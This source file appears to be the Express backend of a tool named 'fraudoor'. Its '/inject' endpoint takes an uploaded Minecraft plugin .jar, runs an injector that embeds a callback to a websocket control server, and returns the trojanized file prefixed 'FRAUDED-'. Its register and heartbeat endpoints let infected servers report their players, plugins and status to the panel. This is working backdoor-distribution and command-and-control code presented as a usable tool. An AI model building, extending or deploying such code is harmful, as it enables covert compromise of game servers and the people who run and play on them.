import { Router } from 'express';
import { v4 as uuidv4 } from 'uuid';
import multer from 'multer';
import { getStore } from './ws.js';
import { spawn } from 'child_process';
import { tmpdir } from 'os';
import { join } from 'path';
import { writeFileSync, unlinkSync, mkdtempSync, readFileSync, existsSync } from 'fs';

export const apiRouter = Router();
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });

function store() {
  return getStore();
}

apiRouter.get('/servers', (req, res) => {
  const list = store().getServers().map(s => ({
    id: s.id, name: s.name, ip: s.ip, port: s.port,
    playerCount: s.playerCount || 0, maxPlayers: s.maxPlayers || 0,
    motd: s.motd || '', version: s.version || '',
    online: s.online || false, tps: s.tps || 20,
    lastSeen: s.lastSeen, type: s.type || 'paper',
  }));
  res.json(list);
});

apiRouter.get('/servers/:id', (req, res) => {
  const s = store().getServer(req.params.id);
  if (!s) return res.status(404).json({ error: 'server not found' });
  res.json({
    id: s.id, name: s.name, ip: s.ip, port: s.port,
    playerCount: s.playerCount || 0, maxPlayers: s.maxPlayers || 0,
    motd: s.motd || '', version: s.version || '',
    online: s.online || false, tps: s.tps || 20,
    lastSeen: s.lastSeen, type: s.type || 'paper',
    plugins: s.plugins || [], players: s.players || [],
  });
});

apiRouter.post('/plugin/register', (req, res) => {
  const { secret, name, ip, port, version, type } = req.body;
  if (secret !== process.env.PLUGIN_SECRET && process.env.PLUGIN_SECRET) {
    return res.status(401).json({ error: 'invalid secret' });
  }
  const id = uuidv4();
  store().addOrUpdateServer(id, { name, ip, port, version, type, online: true });
  res.json({ id });
});

apiRouter.post('/plugin/heartbeat', (req, res) => {
  const { id, playerCount, maxPlayers, motd, tps, players, online } = req.body;
  const s = store().getServer(id);
  if (!s) return res.status(404).json({ error: 'unknown server' });
  store().addOrUpdateServer(id, { playerCount, maxPlayers, motd, tps, players, online });
  res.json({ ok: true });
});

apiRouter.post('/inject', upload.single('plugin'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'no plugin file uploaded' });
  if (!req.file.originalname.endsWith('.jar')) return res.status(400).json({ error: 'file must be a .jar' });

  const platform = req.body.platform || 'paper';
  const tmpDir = mkdtempSync(join(tmpdir(), 'fraudoor-inject-'));
  const inPath = join(tmpDir, req.file.originalname);
  const outPath = join(tmpDir, `FRAUDED-${req.file.originalname}`);

  writeFileSync(inPath, req.file.buffer);

  const injectorJar = join(process.cwd(), 'injector.jar');

  if (!existsSync(injectorJar)) {
    return res.status(501).json({
      error: 'injector backend not available',
      hint: 'Download the injector CLI from /api/injector/download and run it locally',
    });
  }

  const proc = spawn('java', [
    '-jar', injectorJar,
    '--input', inPath,
    '--output', outPath,
    '--platform', platform,
    '--server', process.env.FRAUDOOR_SERVER || 'ws://localhost:8080/ws',
    '--secret', process.env.PLUGIN_SECRET || '',
  ]);

  let stderr = '';
  proc.stderr.on('data', d => stderr += d.toString());

  proc.on('close', (code) => {
    try { unlinkSync(inPath); } catch {}
    if (code !== 0) {
      try { unlinkSync(outPath); } catch {}
      return res.status(500).json({ error: `injector failed: ${stderr}` });
    }
    try {
      const data = readFileSync(outPath);
      unlinkSync(outPath);
      res.set('Content-Type', 'application/java-archive');
      res.set('Content-Disposition', `attachment; filename="FRAUDED-${req.file.originalname}"`);
      res.send(data);
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });
});
